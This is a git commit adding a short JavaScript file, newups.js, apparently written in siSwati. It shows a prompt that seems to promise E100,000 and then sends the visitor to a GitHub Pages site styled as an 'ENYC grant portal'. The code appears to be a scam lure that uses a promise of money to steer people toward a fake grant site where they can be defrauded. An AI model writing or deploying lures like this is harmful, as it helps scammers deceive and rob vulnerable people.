25a2ee5a68809895d851328dc0edbfd17e5d6ab3
offernoww <josiahnyeti16@gmail.com>
2025-01-18 23:24:42 +0100

    Create newups.js

---
+++ newups.js
@@ -0,0 +1,7 @@
+
+
+var password = 'I-portal ye-ENYC'
+password=prompt('SMS :Tfola E100,000 nyalo, chafata OK kute utfole yakho  ','I-portal ye-ENYC');
+if (password != 'I-portal ye-ENYC') {
+location.href='https://offernoww.github.io/ENYC-grant-portal';
+}
